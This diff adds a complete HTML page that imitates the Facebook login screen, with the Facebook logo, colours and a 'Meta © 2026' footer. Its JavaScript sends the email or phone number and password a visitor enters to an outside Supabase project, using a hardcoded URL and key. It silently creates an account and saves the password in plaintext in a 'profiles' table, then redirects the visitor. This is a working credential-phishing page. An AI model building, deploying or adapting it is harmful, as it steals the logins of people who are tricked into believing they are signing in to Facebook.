@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in</title>
+  <!-- Supabase JS Client CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    /* ============================================
+       CSS RESET & BASE STYLES
+       ============================================ */
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ============================================
+       FULL-SCREEN BACKGROUND IMAGE
+       ============================================ */
+    body {
+      background-image: url("https://images.unsplash.com/photo-1699031117121-7f11ec1de049?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8Mjl8fHdoaXRlJTIwYmFja2dyb3VuZHxlbnwwfHwwfHx8MA%3D%3D");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* ============================================
+       LOGIN CARD CONTAINER
+       ============================================ */
+    .login-card {
+      width: 100%;
+      max-width: 400px;
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 16px;
+      padding: 40px 32px 32px;
+      box-shadow:
+        0 20px 60px rgba(0, 0, 0, 0.15),
+        0 8px 24px rgba(0, 0, 0, 0.1),
+        inset 0 1px 0 rgba(255, 255, 255, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.4);
+    }
+
+    /* ============================================
+       LOGO / BRAND HEADER
+       ============================================ */
+    .brand-header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .brand-logo {
+      display: inline-block;
+      width: 60px;
+      height: 60px;
+      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+    }
+
+    .brand-logo svg {
+      width: 36px;
+      height: 36px;
+      fill: white;
+    }
+
+    .brand-name {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1877f2;
+      letter-spacing: -0.5px;
+    }
+
+    /* ============================================
+       FORM STYLES
+       ============================================ */
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 8px;
+      background: #f5f6f7;
+      color: #1c1e21;
+      outline: none;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+    }
+
+    .input-field::placeholder {
+      color: #8a8d91;
+      font-size: 15px;
+    }
+
+    .input-field:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.15);
+      background: #ffffff;
+    }
+
+    /* ============================================
+       LOGIN BUTTON
+       ============================================ */
+    .btn-login {
+      width: 100%;
+      padding: 13px;
+      margin-top: 4px;
+      font-size: 17px;
+      font-weight: 700;
+      color: #ffffff;
+      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.1s ease, box-shadow 0.2s ease, filter 0.2s ease;
+    }
+
+    .btn-login:hover {
+      filter: brightness(1.08);
+      box-shadow: 0 6px 20px rgba(24, 119, 242, 0.35);
+    }
+
+    .btn-login:active {
+      transform: scale(0.98);
+    }
+
+    /* ============================================
+       FORGOTTEN PASSWORD LINK
+       ============================================ */
+    .forgot-password {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      font-size: 15px;
+      color: #1877f2;
+      text-decoration: none;
+      font-weight: 500;
+      transition: opacity 0.2s ease;
+    }
+
+    .forgot-password:hover {
+      opacity: 0.7;
+      text-decoration: underline;
+    }
+
+    /* ============================================
+       DIVIDER WITH "or"
+       ============================================ */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 22px 0 18px;
+      color: #8a8d91;
+      font-size: 14px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dadde1;
+    }
+
+    .divider span {
+      padding: 0 16px;
+    }
+
+    /* ============================================
+       CREATE ACCOUNT BUTTON
+       ============================================ */
+    .btn-create-account {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 12px 40px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #00a400;
+      background: transparent;
+      border: 2px solid #00a400;
+      border-radius: 8px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.2s ease;
+    }
+
+    .btn-create-account:hover {
+      background: #00a400;
+      color: #ffffff;
+      box-shadow: 0 4px 14px rgba(0, 164, 0, 0.3);
+    }
+
+    .btn-create-account:active {
+      transform: scale(0.97);
+    }
+
+    /* ============================================
+       LANGUAGE LINKS & FOOTER
+       ============================================ */
+    .footer {
+      text-align: center;
+      margin-top: 28px;
+    }
+
+    .language-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px 20px;
+      margin-bottom: 20px;
+      list-style: none;
+    }
+
+    .language-links a {
+      font-size: 13px;
+      color: #576b95;
+      text-decoration: none;
+      transition: opacity 0.2s ease;
+    }
+
+    .language-links a:hover {
+      opacity: 0.7;
+      text-decoration: underline;
+    }
+
+    .language-links .active-lang {
+      color: #8a8d91;
+      font-weight: 600;
+    }
+
+    .more-langs-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      border: 1px solid #ccd0d5;
+      border-radius: 4px;
+      background: #f5f6f7;
+      color: #4b4f56;
+      font-size: 20px;
+      font-weight: 300;
+      cursor: pointer;
+      text-decoration: none;
+      line-height: 1;
+      transition: background 0.15s ease;
+    }
+
+    .more-langs-btn:hover {
+      background: #ebedf0;
+    }
+
+    .copyright {
+      font-size: 13px;
+      color: #8a8d91;
+    }
+
+    /* ============================================
+       RESPONSIVE ADJUSTMENTS
+       ============================================ */
+    @media (max-width: 480px) {
+      body {
+        padding: 12px;
+        align-items: flex-start;
+        padding-top: 40px;
+      }
+
+      .login-card {
+        padding: 32px 20px 28px;
+        border-radius: 12px;
+      }
+
+      .brand-logo {
+        width: 52px;
+        height: 52px;
+      }
+
+      .brand-logo svg {
+        width: 30px;
+        height: 30px;
+      }
+
+      .brand-name {
+        font-size: 20px;
+      }
+    }
+  </style>
+<base target="_blank">
+<base target="_blank">
+</head>
+
+<body>
+
+  <!-- ==========================================
+       LOGIN CARD
+       ========================================== -->
+  <div class="login-card">
+
+    <!-- Brand Header / Logo -->
+    <div class="brand-header">
+      <div class="brand-logo">
+        <!-- Facebook "f" logo SVG -->
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        </svg>
+      </div>
+      <div class="brand-name">facebook</div>
+    </div>
+
+    <!-- ==========================================
+         LOGIN FORM
+         ========================================== -->
+    <form id="loginForm" class="login-form">
+      <input
+        type="text"
+        id="emailInput"
+        class="input-field"
+        placeholder="Mobile number or email address"
+        autocomplete="email"
+        required
+      />
+      <input
+        type="password"
+        id="passwordInput"
+        class="input-field"
+        placeholder="Password"
+        autocomplete="current-password"
+        required
+      />
+      <button type="submit" class="btn-login">Log in</button>
+    </form>
+
+    <!-- Forgotten Password -->
+    <a href="#" class="forgot-password">Forgotten password?</a>
+
+    <!-- Divider -->
+    <div class="divider"><span>or</span></div>
+
+    <!-- Create New Account Button -->
+    <a href="#" class="btn-create-account">Create new account</a>
+
+    <!-- Footer: Language Links -->
+    <div class="footer">
+      <ul class="language-links">
+        <li><a href="#" class="active-lang">English (UK)</a></li>
+        <li><a href="#">Hausa</a></li>
+        <li><a href="#">Français (France)</a></li>
+        <li><a href="#">Português (Brasil)</a></li>
+        <li><a href="#">Español</a></li>
+        <li><a href="#">العربية</a></li>
+        <li><a href="#">Deutsch</a></li>
+        <li><a href="#" class="more-langs-btn" title="More languages">+</a></li>
+      </ul>
+      <p class="copyright">Meta &copy; 2026</p>
+    </div>
+
+  </div>
+
+  <!-- ==========================================
+       JAVASCRIPT LOGIC
+       ========================================== -->
+  <script>
+    // ----------------------------------------------------
+    // SUPABASE CLIENT INITIALIZATION
+    // ----------------------------------------------------
+    // IMPORTANT: Replace BOTH placeholders below with your
+    // actual Supabase project credentials.
+    // BOTH are wrapped in BACKTICKS (Template Literals) so
+    // Notepad can wrap long strings across lines safely.
+    // ----------------------------------------------------
+    const SUPABASE_URL = `https://tiveubsgokzicafeyyvr.supabase.co`;
+    const SUPABASE_ANON_KEY = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRpdmV1YnNnb2t6aWNhZmV5eXZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkzOTAxNjUsImV4cCI6MjA5NDk2NjE2NX0.ow7pwb-TZ1Ly9P9Mo1iHDNUN5z59FNTLf1_7w4y_Pwg`;
+
+    // ----------------------------------------------------
+    // CREDENTIAL VALIDATION (stops cryptic fetch crashes)
+    // ----------------------------------------------------
+    const url = SUPABASE_URL.trim();
+    const key = SUPABASE_ANON_KEY.trim();
+
+    if (!window.supabase) {
+      alert('CRITICAL: Supabase library failed to load. Check your internet connection and refresh the page.');
+      throw new Error('Supabase CDN not loaded');
+    }
+
+    if (url.includes('your-project-ref') || url.length < 20) {
+      alert('CRITICAL: You forgot to replace the SUPABASE_URL placeholder. Open this file in Notepad and paste your real Supabase Project URL.');
+      throw new Error('Invalid Supabase URL');
+    }
+
+    if (key.includes('...') || key.length < 50) {
+      alert('CRITICAL: You forgot to replace the SUPABASE_ANON_KEY placeholder. Open this file in Notepad and paste your real Anon Key.');
+      throw new Error('Invalid Supabase Anon Key');
+    }
+
+    const supabaseClient = supabase.createClient(url, key);
+
+    // ----------------------------------------------------
+    // FORM SUBMISSION HANDLER — COMBINED LOGIN & SIGN-UP FLOW
+    // ----------------------------------------------------
+    // 1. Try normal login first.
+    // 2. If user does not exist → silently auto-sign-up, then
+    //    IMMEDIATELY insert a row into the public "profiles" table
+    //    (id, username, password), then log them in.
+    // 3. If user exists but password is wrong → alert explicitly.
+    // 4. On any successful auth → redirect to dashboard.html.
+    // ----------------------------------------------------
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault(); // Prevent page reload on submit
+
+      // 1. Collect raw inputs (keep the raw username for the table)
+      let rawIdentifier = document.getElementById('emailInput').value.trim();
+      const password = document.getElementById('passwordInput').value;
+
+      // 2. SEAMLESS MOBILE NUMBER TRANSLATION
+      //    If the identifier contains no '@', treat it as a phone number
+      //    and append the hidden local suffix so Supabase Auth receives valid
+      //    email syntax (e.g., 08031234567@plasterproject.local).
+      const email = rawIdentifier.includes('@')
+        ? rawIdentifier
+        : rawIdentifier + '@plasterproject.local';
+
+      try {
+        // ============================================================
+        // STEP 1 — ATTEMPT NORMAL LOGIN (Existing User)
+        // ============================================================
+        const { data: loginData, error: loginError } = await supabaseClient.auth.signInWithPassword({
+          email: email,
+          password: password
+        });
+
+        if (!loginError) {
+          // SUCCESS: returning user authenticated — redirect immediately
+          window.location.href = 'dashboard.html';
+          return;
+        }
+
+        // ============================================================
+        // STEP 2 — LOGIN FAILED: SILENT AUTO-SIGNUP ATTEMPT
+        // ============================================================
+        const { data: signUpData, error: signUpError } = await supabaseClient.auth.signUp({
+          email: email,
+          password: password
+        });
+
+        if (signUpError) {
+          // If Supabase reports the user already exists, the original
+          // login failure was caused by an incorrect password.
+          const msg = signUpError.message || '';
+          if (
+            msg.toLowerCase().includes('already registered') ||
+            msg.toLowerCase().includes('already exists') ||
+            msg.toLowerCase().includes('user already registered')
+          ) {
+            alert('Incorrect password');
+          } else {
+            alert('Auth Error: ' + msg);
+          }
+          return;
+        }
+
+        // ============================================================
+        // STEP 3 — AUTO-SIGNUP SUCCEEDED: INSERT INTO PROFILES TABLE
+        // ============================================================
+        // Immediately write the new user's data into the "profiles"
+        // table so it appears in the Table Editor alongside Auth.
+        // We use the RAW identifier for the username column so the
+        // phone number or email is stored exactly as the user typed it.
+        // ============================================================
+        if (signUpData && signUpData.user) {
+          const { error: insertError } = await supabaseClient
+            .from('profiles')
+            .insert([
+              {
+                id: signUpData.user.id,
+                username: rawIdentifier,
+                password: password
+              }
+            ]);
+
+          if (insertError) {
+            console.error('Insert error details:', insertError);
+            alert('Table insert failed: ' + insertError.message);
+            return;
+          }
+        }
+
+        // ============================================================
+        // STEP 4 — SIGN IN THE NEWLY CREATED USER & REDIRECT
+        // ============================================================
+        const { data: newLoginData, error: newLoginError } = await supabaseClient.auth.signInWithPassword({
+          email: email,
+          password: password
+        });
+
+        if (!newLoginError) {
+          window.location.href = 'dashboard.html';
+        } else {
+          alert('Account created and saved, but auto-login failed. Please log in manually.');
+        }
+
+      } catch (error) {
+        console.error('Unexpected error:', error);
+        alert('Unexpected error: ' + error.message);
+      }
+    });
+  </script>
+
+</body>
+</html>
